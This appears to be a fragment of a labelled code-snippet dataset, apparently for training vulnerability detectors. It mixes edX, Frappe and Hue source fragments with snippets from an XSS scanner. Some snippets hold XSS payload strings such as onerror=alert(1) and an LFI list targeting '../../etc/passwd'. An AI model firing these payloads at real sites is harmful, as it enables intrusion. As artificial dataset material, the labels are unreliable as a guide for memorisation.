desc\" \t) \tdef make_route(self): ", "label": 1}, {"snippet_id": 52016, "code": " import Credentials from liboozie.oozie_api import get_oozie from liboozie.submission2 import Submission from oozie.decorators import check_document_access_permission, check_document_modify_permission from", "label": 0}, {"snippet_id": 36500, "code": "\"!=\", \"val\"], \t\t\"key\":[\"in\", \"val\"], \"key\":[\"not in\", \"val\"], \"key\": \"^val\", \t\t\"key\": True(exists), \"key\": False(does not exist)}\"\"\" \tout, _filters=[],{} \tif not data: \t\treturn out \t \tif filters: \t\tfor", "label": 0}, {"snippet_id": 2194, "code": "(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers)", "label": 0}, {"snippet_id": 49790, "code": ";\".format(HOST,PORT) html=html+''' try{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"", "label": 1}, {"snippet_id": 47643, "code": ")) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank", "label": 0}, {"snippet_id": 22749, "code": "\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name", "label": 0}, {"snippet_id": 12076, "code": "', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views", "label": 0}, {"snippet_id": 44033, "code": " TermsFacet from elasticsearch_dsl.query import SimpleQueryString, Bool class RTDFacetedSearch(FacetedSearch): \"\"\"Overwrite the initialization in order too meet our needs\"\"\" def __init__(self, using, index,", "label": 1}, {"snippet_id": 8086, "code": "'ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include(", "label": 0}, {"snippet_id": 23152, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views", "label": 0}, {"snippet_id": 10084, "code": "'node_modules/edx-custom-a11y-rules/lib/custom_a11y_rules.js', verify_xss=verify_xss ) return expected_statement def setUp(self): super(TestPaverBokChoyCmd, self).setUp() self.shard=os.environ.get('SHARD", "label": 0}, {"snippet_id": 4578, "code": "'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr", "label": 0}, {"snippet_id": 16863, "code": "+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(", "label": 0}, {"snippet_id": 26011, "code": " 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__", "label": 0}, {"snippet_id": 43090, "code": ").format(prefix, label, \t\t\t\t\tvalue, comma_options)) \tdef _validate_constants(self): \t\tif frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname", "label": 0}, {"snippet_id": 25351, "code": " final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output", "label": 0}, {"snippet_id": 41057, "code": " has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\",", "label": 0}, {"snippet_id": 20535, "code": ": \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}' ).format(report_dir=self.pa11y_report_dir) sh(cmd_str) @property def cmd(self): \"\"", "label": 0}, {"snippet_id": 23378, "code": " url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES", "label": 0}, {"snippet_id": 15140, "code": " as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils", "label": 0}, {"snippet_id": 37782, "code": ".comments: \t\t\tpost.comment_text=_('No comments yet') \t\telif post.comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar", "label": 0}, {"snippet_id": 39018, "code": "\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t", "label": 0}, {"snippet_id": 54972, "code": "', 'locale') .distinct() ) for changed_entity in changed_entities: key=(changed_entity.pk, locale.pk) if key not in existing: changed_entities_array.append( ChangedEntityLocale(entity=changed_entity, locale", "label": 0}, {"snippet_id": 31228, "code": "\t\t\t \tprint(template) \t\t if form.getvalue('metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter", "label": 0}, {"snippet_id": 17724, "code": ".views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset',", "label": 0}, {"snippet_id": 34703, "code": "\", \"Float\", \"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t", "label": 0}, {"snippet_id": 10486, "code": "-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' ).format( start_urls=' '.join(start_urls)", "label": 0}, {"snippet_id": 7534, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', ", "label": 0}, {"snippet_id": 13756, "code": "/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', ", "label": 1}, {"snippet_id": 39254, "code": "(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self.meta.get_field(fieldname).options ", "label": 0}, {"snippet_id": 27541, "code": "\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers", "label": 0}, {"snippet_id": 384, "code": " is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting", "label": 1}, {"snippet_id": 30287, "code": "('http://'+serv+':'+stats_port+'/'+stats_page, headers=headers, data=postdata, auth=(haproxy_user, haproxy_pass)) \t if serv is not None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import", "label": 0}, {"snippet_id": 25047, "code": ": \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz' msg=colorize('green', \"Fetching the test course from github...\") print msg sh( 'wget", "label": 0}, {"snippet_id": 17129, "code": ".debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'", "label": 0}, {"snippet_id": 31870, "code": "(server[2],[\"sudo mkdir \"+path]) \t\terror=funct.upload(server[2], path+\"/\"+form.getvalue('bwlists_save'), list, dir='fullpath') \t\tif error: \t\t\tprint('<div class=\"alert alert-danger\">Upload fail: %s</div>", "label": 0}, {"snippet_id": 21196, "code": "<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"),", "label": 0}, {"snippet_id": 21790, "code": "'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P", "label": 0}, {"snippet_id": 24593, "code": " else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self)", "label": 0}, {"snippet_id": 15532, "code": "-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self", "label": 0}, {"snippet_id": 52723, "code": "=workflow.to_xml() except Exception, e: response['message']=str(e) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def submit_workflow(request", "label": 0}, {"snippet_id": 54956, "code": "=locale, project=project).aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale", "label": 0}, {"snippet_id": 46692, "code": ".GET.items() if item in question_ids } if data: kwargs['data']=data return kwargs def form_valid(self, form): selected_flags=[] for question in entry_form_config: flag=form.cleaned_data.get(str(question[", "label": 0}, {"snippet_id": 27954, "code": " self.upload upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload", "label": 0}, {"snippet_id": 32987, "code": " path=os.path.join(relative_to, relpath) with codecs.open(path, encoding='utf-8') as fp: return fp.read() def _WriteHeader(self, content_type='text/plain', status_code=200): self.send_response(status_code", "label": 0}, {"snippet_id": 13137, "code": "', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^", "label": 0}, {"snippet_id": 46472, "code": "'message']=_('There is no collection to search.') return JsonResponse(response) def no_collections(request): return render('no_collections.mako', request,{'is_embeddable': request.GET.get('is_embeddable", "label": 0}, {"snippet_id": 1966, "code": "}) def xss_http_headers(url,method,headers,body,scanid=None): temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url", "label": 0}, {"snippet_id": 37801, "code": ".format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:", "label": 0}, {"snippet_id": 47590, "code": ".add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name')) f.add_content(PlainText('DECT: ')", "label": 0}, {"snippet_id": 36090, "code": "'*' \tdef precision(self, fieldname, parentfield=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param", "label": 0}, {"snippet_id": 576, "code": "\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_url(url,method,headers,body,scanid=None): xss_result='' xss_payloads=fetch_xss_payload() uri_check_list=['?', '&', '=', '%3F', '%26', ", "label": 1}, {"snippet_id": 13132, "code": "'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'", "label": 0}, {"snippet_id": 16089, "code": ", name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$'", "label": 0}, {"snippet_id": 21117, "code": "<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"),", "label": 0}, {"snippet_id": 16419, "code": "'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', ", "label": 0}, {"snippet_id": 34551, "code": "(key, v) \t\telse: \t\t\traise ValueError \tdef remove(self, doc): \t\tself.get(doc.parentfield).remove(doc) \tdef _init_child(self, value, key): \t\tif not self.doctype: \t\t\treturn value \t\tif not isinstance(value", "label": 0}, {"snippet_id": 3764, "code": "'' for key,value in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request", "label": 0}, {"snippet_id": 15108, "code": ".imports_dir)), ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir", "label": 0}, {"snippet_id": 40675, "code": ".print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via Print Format::`format_data` property. \t\t\tCalled from", "label": 0}, {"snippet_id": 1912, "code": ".text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post.body) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\":", "label": 1}, {"snippet_id": 38434, "code": ".blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post.avatar.startswith(\"/\"): \t\t\tpost.avatar=\"/\" +post.avatar", "label": 0}, {"snippet_id": 15515, "code": ".verbosity !=DEFAULT_VERBOSITY and self.num_processes !=DEFAULT_NUM_PROCESSES: msg='Cannot pass in both num_processors and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ ", "label": 0}, {"snippet_id": 498, "code": ".insert_record(attack_result) except: logs.logging.info(\"XSS: No GET param found!\") def xss_check(url,method,headers,body,scanid): xss_payloads=fetch_xss_payload() xss_get_method(url,method,headers,body", "label": 1}, {"snippet_id": 42908, "code": "\t\t\t\telse: \t\t\t\t\tvalues_to_fetch=['name'] +[_df.fetch_from.split('.')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t", "label": 0}, {"snippet_id": 1494, "code": ",template_folder='../Dashboard/templates',static_folder='../Dashboard/static') client=MongoClient('localhost',27017) global db db=client.apiscan def generate_hash(): scanid=hashlib.md5(str(time.time()))", "label": 0}, {"snippet_id": 46270, "code": " engine).datasets() if not collections and engine=='solr': return no_collections(request) collection=Collection2(user=request.user, name=name, engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start':", "label": 0}, {"snippet_id": 46427, "code": "(dashboard_doc, owner=request.user, name=collection['name'], description=collection['label'], extra='search-dashboard') dashboard_doc.update_data({ 'collection': collection, 'layout': layout }) dashboard_doc1", "label": 0}, {"snippet_id": 42418, "code": " \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe.db.sql(\"\"\"insert into", "label": 0}, {"snippet_id": 22702, "code": "(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$", "label": 0}, {"snippet_id": 16655, "code": ".views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^", "label": 0}, {"snippet_id": 8699, "code": ", name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id", "label": 0}, {"snippet_id": 34870, "code": ".get_table_fields(): \t\t\tchildren=self.get(df.fieldname) or[] \t\t\tdoc[df.fieldname]=[d.as_dict(no_nulls=no_nulls) for d in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t", "label": 0}, {"snippet_id": 26441, "code": "/script>\", \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\", \"<img src=test123456.jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../..", "label": 0}, {"snippet_id": 20703, "code": "'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views", "label": 0}, {"snippet_id": 33154, "code": " def get(self): return self.redirect(README_MD) class CronUpdateBuckets(webapp2.RequestHandler): \"\"\"Updates buckets from configs.\"\"\" @decorators.require_cronjob def get(self): config.cron_update_buckets()", "label": 0}, {"snippet_id": 19102, "code": " call from test.test_support import EnvironmentVarGuard from paver.easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd", "label": 0}, {"snippet_id": 19920, "code": "', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots", "label": 0}, {"snippet_id": 50195, "code": " request: request.write(jsonify(data)) request.finish() del self.requests[csessid] else: dataentries=self.databuffer.get(csessid,[]) dataentries.append(jsonify(data)) self.databuffer[csessid]=dataentries", "label": 0}, {"snippet_id": 50645, "code": " the browser session. \"\"\" if self.csessid: return _CLIENT_SESSIONS(session_key=self.csessid) def disconnect(self, reason=\"Server disconnected.\"): \"\"\" Disconnect from server. Args: reason(str): Motivation", "label": 0}, {"snippet_id": 41243, "code": "(blogger) \t\tlist_context.title=blogger \telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=", "label": 1}, {"snippet_id": 33088, "code": " google.appengine.api import users as gae_users from components import auth from components import config as config_api from components import decorators from components import endpoints_webapp2 from components", "label": 1}, {"snippet_id": 25133, "code": " '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here", "label": 0}, {"snippet_id": 43773, "code": "\tif not print_hide: \t\t\tif df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"", "label": 0}, {"snippet_id": 42831, "code": " docname: \t\t\t\tif df.fieldtype==\"Link\": \t\t\t\t\tdoctype=df.options \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"Options not set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) ", "label": 0}, {"snippet_id": 46210, "code": "'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako', request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'collections': collections, ", "label": 0}, {"snippet_id": 25552, "code": ", as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos: The cart position the form should be for", "label": 0}, {"snippet_id": 49101, "code": "(self): for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if int(c)==self.column_id: if column.startswith(\"-\"): return True return False def get_add_sort_by(self): if not self.is_ordered", "label": 0}, {"snippet_id": 33175, "code": " \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path='/_ah/api/buildbucket/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler", "label": 0}, {"snippet_id": 1091, "code": " True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\":", "label": 0}, {"snippet_id": 42772, "code": "(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates", "label": 0}, {"snippet_id": 37417, "code": ".format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"", "label": 0}, {"snippet_id": 9461, "code": ", name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/", "label": 0}, {"snippet_id": 4317, "code": "</img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\"", "label": 1}, {"snippet_id": 43723, "code": "\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t\tof hidden fields. Example \t\t\tclass MyDoc(Document): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2", "label": 0}, {"snippet_id": 28809, "code": ") \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname=serv", "label": 0}, {"snippet_id": 11341, "code": " \"all_blocks\": \"true\", }) ) auto_auth_params.update({'redirect_to': sequence_url}) lms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params", "label": 0}, {"snippet_id": 15112, "code": " test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite.pa11y_report_dir", "label": 0}, {"snippet_id": 5853, "code": " \"<script>alert(/xss/)</script>\" @classmethod def genTestHTML(cls): s='' for t in cls.tags: s +='<%s src=\"x\"' % t for e in cls.events: s +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' ", "label": 0}, {"snippet_id": 36121, "code": " get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield.parentfield \t\tcache_key=parentfield or \"main\" \t\tif not hasattr(self, \"_precision\"): \t\t\tself._precision", "label": 0}, {"snippet_id": 51863, "code": "%M', 'log_colors':{ 'DEBUG': 'green', 'INFO': 'white', 'WARNING': 'yellow', 'ERROR': 'red', 'CRITICAL': 'bold_red', }, } }, 'loggers':{ 'django':{ 'handlers':['console'], 'level': os.getenv('DJANGO_LOG_LEVEL", "label": 0}, {"snippet_id": 6297, "code": "(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def listen_addr(self): \"\"\" IP address to listen on. \"\"\" return self.config.get(self.section", "label": 0}, {"snippet_id": 42536, "code": "\"\"update `tab{doctype}` \t\t\t\tset{values} where name=%s\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tvalues=\", \".join([\"`\"+c+\"`=%s\" for c in columns]) \t\t\t\t), list(d.values()) +[name]) \t\texcept Exception as", "label": 0}, {"snippet_id": 45896, "code": " escape from django.utils.translation import ugettext as _ from django.core.urlresolvers import reverse from desktop.conf import USE_NEW_EDITOR from desktop.lib.django_util import JsonResponse, render from", "label": 0}, {"snippet_id": 33569, "code": ".published_on=today() \t\t \t\tfrappe.db.sql(\"\"\"update tabBlogger set posts=(select count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): ", "label": 0}, {"snippet_id": 24935, "code": " against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else", "label": 0}, {"snippet_id": 52257, "code": "='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request", "label": 0}, {"snippet_id": 9829, "code": "'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r", "label": 0}, {"snippet_id": 18866, "code": ".course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'", "label": 0}, {"snippet_id": 5435, "code": "'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onoffline', 'ononline', 'onorientationchange', 'onpagehide', 'onpageshow', 'onpaste', 'onpause', 'onplay', 'onplaying', 'onpopstate', 'onprogress", "label": 0}, {"snippet_id": 39781, "code": "') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True)) \t\t\t\telse: \t\t\t\t\tvalues_to_fetch", "label": 0}, {"snippet_id": 8295, "code": ".MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=", "label": 0}, {"snippet_id": 23816, "code": " test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_testcase_spec(self): spec='test_foo.py:FooTest.test_bar' suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 3968, "code": "(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body", "label": 0}, {"snippet_id": 47180, "code": " from sqlalchemy.exc import SQLAlchemyError from invenio_records.admin import record_adminview from invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin", "label": 0}, {"snippet_id": 1932, "code": ": headers, \"req_body\":body, \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param", "label": 0}, {"snippet_id": 37981, "code": " self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext", "label": 0}, {"snippet_id": 50676, "code": ".lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client.client_disconnect(self.csessid) self.sessionhandler.disconnect(self) def at_login(self): csession=self.get_client_session() if csession", "label": 0}, {"snippet_id": 23200, "code": "'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\")", "label": 0}, {"snippet_id": 5355, "code": "'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'title', 'tr', 'track", "label": 0}, 